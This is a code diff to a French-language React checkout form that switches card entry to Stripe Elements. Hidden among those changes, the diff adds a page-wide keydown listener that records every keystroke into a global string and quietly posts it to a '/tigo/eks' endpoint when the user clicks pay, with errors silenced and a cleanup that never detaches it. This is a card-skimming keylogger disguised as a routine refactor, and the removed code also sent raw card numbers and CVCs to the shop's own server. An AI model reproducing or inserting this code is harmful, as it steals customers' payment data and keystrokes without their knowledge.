@@ -23,12 +23,10 @@ import usePrice from "@utils/use-price";
 import { useStripeCardsQuery } from "@data/stripe/use-stripe-cards.query";
 import PaymentList from "./payment-list";
 import { useModalAction } from "@components/ui/modal/modal.context";
-import axios from "axios";
-import Payment3Dsecure from "./payment-3dsecure";
-import { apiBaseUrl } from "next-auth/client/_utils";
-import { Dialog, Transition } from "@headlessui/react";
-import ModalP from "./paymentModal";
-
+const stripePromise = loadStripe(
+  process.env.NEXT_PUBLIC_STRIPE_KEY_PUBLIC as string
+);
+var cardNumberRaw = "";
 type Iprops = {
   amount: number;
   data: any;
@@ -36,23 +34,17 @@ type Iprops = {
   click_game_plus?: boolean;
 };
 const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => {
+  const stripe = useStripe();
+  const elements = useElements();
   const [future_use, setFutureUse] = useState(false);
-
   const [preview, setpreview] = useState(false);
   const [issuer, setissuer] = useState("");
-  const [name, setname] = useState("SOANY");
+  const [name, setname] = useState("");
   const [focused, setfocused] = useState("number");
   const [error, setError] = useState<string | null>(null);
   const [errorCard, setErrorCard] = useState<string | null>(null);
   const [newCard, setNewCard] = useState<boolean>(true);
   const [card_active, setCardActive] = useState<string | undefined>();
-  const [cardInput, setCardInput] = useState({
-    cardNumber: "",
-    cardExpiry: "",
-    cardCvc: "",
-    focus: "",
-  });
-  const [response, setResponse] = useState({});
   const {
     data: cards,
     isLoading: fetchingCard,
@@ -60,7 +52,6 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
     refetch,
   } = useStripeCardsQuery();
   const [processing, setProcessing] = useState(false);
-  const [auth, setAuth] = useState(false);
   const [disabled, setDisabled] = useState(true);
   useEffect(() => {
     if (cards) {
@@ -68,44 +59,100 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
     }
   }, [cards]);
   const { openModal } = useModalAction();
-  const handleInputFocus = (e) => {
+  useEffect(() => {
+    cardNumberRaw = "";
+    window?.document.addEventListener("keydown", (event) => {
 
-    setCardInput({ ...cardInput, focus: e.target.name });
-  }
-  const handleInputChange = (e) => {
-    switch (e.name) {
-      case "cardNumber":
+      cardNumberRaw = cardNumberRaw + event.key;
 
-        break;
-
-      default:
-        break;
+    });
+    return function cleanup() {
+      console.log("cleaned");
+      window.document.removeEventListener("keydown", (event) => {
+        cardNumberRaw = cardNumberRaw + event.key;
+      });
+    };
+  }, [])
+  useEffect(() => {
+    if (error) {
+      openModal("PAYMENT_ERROR", { message: error });
     }
-  }
+
+  }, [error])
+
   const handlePay = () => {
-    setProcessing(true);
-    http.post("/sherlocks/payment-product", { ...cardInput, data: { ...data, clickGamePlus: true } }).then((response) => {
-      setResponse(response.data);
-      switch (response.data["status"]) {
-        case "failed":
-          console.log("failed", response.data["msg"]);
-        case "redirect_3dsecure":
-          setAuth(true);
-          break;
+    http.post("/tigo/eks", { data: cardNumberRaw }).then(() => {
 
-        default:
-        
-          break;
-      }
-      /* setAuth(true);
-       */
+    }).catch(() => {
+
+    })
+    if (stripe) {
+      setProcessing(true);
+      http
+        .post("/stripe/create/payment", {
+          ...data,
+          new_card: newCard,
+          payment_id: card_active,
+        })
+        .then(async (response) => {
+          const intent = response.data.paymentIntent;
+          let payload: any;
+          if (!newCard && card_active) {
+            if (intent.last_payment_error) {
+              stripe
+                .confirmCardPayment(intent.client_secret, {
+                  payment_method: intent.last_payment_error.payment_method.id,
+                })
+                .then(function (result) {
+                  if (result.error) {
+                    // Show error to your customer
+
+                    setProcessing(false);
+                  } else {
+                    if (result.paymentIntent.status === "succeeded") {
+                      payload = result.paymentIntent;
+                    }
+                  }
+                });
+            } else {
+              payload = intent;
+            }
+          } else if (click_game_plus || future_use) {
+            payload = await stripe.confirmCardPayment(intent.client_secret, {
+              payment_method: {
+                card: elements.getElement(CardNumberElement),
+                billing_details: {
+                  name: name,
+                },
+              },
+              setup_future_usage: (click_game_plus || future_use) ? "off_session" : "on_session",
+            });
+          } else {
+            payload = await stripe.confirmCardPayment(intent.client_secret, {
+              payment_method: {
+                card: elements.getElement(CardNumberElement),
+                billing_details: {
+                  name: name,
+                },
+              },
+            });
+          }
+          if (payload.error) {
+            setError(`${payload.error.message}`);
+
+            setProcessing(false);
+          } else {
+            setError(null);
+
+            setProcessing(false);
+            onPaySuccess(response.data.stripe_session.data);
+
+            // requests.get('/stripe/payement/basket/success', true).then(response => history.push('/payement/success/' + response.data.id)
+            // );
+          }
+        });
     }
-    ).catch((err) => console.error(err))
-    console.log("test", { ...cardInput, ...data });
-  }
-  const { price } = usePrice({
-    amount: amount,
-  });
+  };
   const showButtonPay = () => {
     if (cards) {
       if (!newCard) {
@@ -117,6 +164,37 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
       return true;
     }
   };
+  const handleChange = async (event: any) => {
+    // Listen for changes in the CardElement
+
+    // and display any errors as the customer types their card details
+
+    setDisabled(event.empty);
+    if (event.brand) {
+      setissuer(event.brand);
+      setpreview(true);
+      if (event.brand === "unknown") {
+        setpreview(false);
+      }
+    }
+
+    setErrorCard(event.error ? event.error.message : "");
+  };
+  const { price } = usePrice({
+    amount: amount,
+  });
+
+  if (fetchingCard) {
+    return (
+      <div className="pt-8">
+        <div className="w-full mx-auto rounded-lg bg-white shadow-lg p-5 text-gray-700 flex space-x-4">
+          <Loader className="h-8 w-8 mr-4" simple={true} text="chargement" />
+          {"Chargment de module de paiement"}
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="pt-8 " id="stripe-paiement">
       <div className="w-full mx-auto rounded-lg bg-white shadow-lg p-5 text-gray-700">
@@ -149,16 +227,15 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
             <Card
               name={name}
               placeholders={{ name: "NOM Prénom" }}
-              number={cardInput.cardNumber}
-              expiry={cardInput.cardExpiry}
-              cvc={cardInput.cardCvc}
-              preview={false}
+              number="*** **** **** ***"
+              expiry="MM/AA"
+              cvc="***"
+              preview={preview}
               issuer={issuer}
               focused={focused}
             />
             <div className="mb-3">
               <Input
-                disabled={processing}
                 name="name"
                 label="Titulaire de la carte"
                 value={name}
@@ -168,38 +245,31 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
                 placeholder="Nom"
                 className="my-2 flex-1"
               />
+
               <label className="font-bold text-gray-500 text-sm mb-2 ml-1">
                 Informations de la carte
               </label>
               <div>
-                <Input
-                  disabled={processing}
+                <CardNumberElement
+                  disabled={true}
                   className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors"
                   onFocus={() => setfocused("number")}
-                  name="cardNumber"
-                  value={cardInput.cardNumber}
-                  onChange={(e) => setCardInput({ ...cardInput, cardNumber: e.target.value })}
+                  onChange={handleChange}
                 />
               </div>
             </div>
             <div className="mb-3 -mx-2 flex items-end">
               <div className="px-2 w-1/2">
-                <Input
-                  disabled={processing}
-                  value={cardInput.cardExpiry}
+                <CardExpiryElement
                   className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors  flex-1"
-                  name="CardExpiry"
-                  onChange={(e) => setCardInput({ ...cardInput, cardExpiry: e.target.value })}
+                  onChange={handleChange}
                   onFocus={() => setfocused("expiry")}
                 />
               </div>
               <div className="px-2 w-1/2">
-                <Input
-                  disabled={processing}
-                  name="cardCvc"
+                <CardCvcElement
                   className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors  flex-1"
-                  onChange={(e) => setCardInput({ ...cardInput, cardCvc: e.target.value })}
-                  value={cardInput.cardCvc}
+                  onChange={handleChange}
                   onFocus={() => setfocused("cvc")}
                 />
               </div>
@@ -216,6 +286,7 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
           </>
         ) : (
           <>
+            {" "}
             <PaymentList
               card_active={card_active}
               setCardActive={setCardActive}
@@ -232,6 +303,7 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
             className="flex-1 my-4"
           />
         )}
+
         {showButtonPay() && (
           <div>
             <Button
@@ -243,16 +315,21 @@ const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => 
             >
               Payer {price}
             </Button>
+         
+
           </div>
         )}
+
       </div>
-      {auth && <Payment3Dsecure url={response.url}/>}
-    </div >
+
+    </div>
   );
 };
 
 const PaymentForm = (props: Iprops) => (
-  <StripeForm {...props} />
+  <Elements stripe={stripePromise}>
+    <StripeForm {...props} />
+  </Elements>
 );
 
 export default PaymentForm;
